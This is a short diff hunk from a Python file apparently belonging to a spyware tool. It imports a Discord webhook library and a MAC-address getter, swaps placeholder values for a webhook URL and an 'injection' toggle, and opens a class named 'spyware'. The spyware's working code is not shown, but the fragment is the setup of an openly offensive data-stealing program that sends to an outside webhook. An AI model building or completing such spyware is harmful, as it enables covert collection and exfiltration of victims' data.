@@ -30,8 +30,8 @@ from urllib.request import urlopen
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
-weblink = "UR WEBHOOK HERE"
-injection = "YES OR NO | I REC YES"
+weblink = "YOUR_WEBHOOK"
+injection = "YES_NO"
 
 
 class spyware:
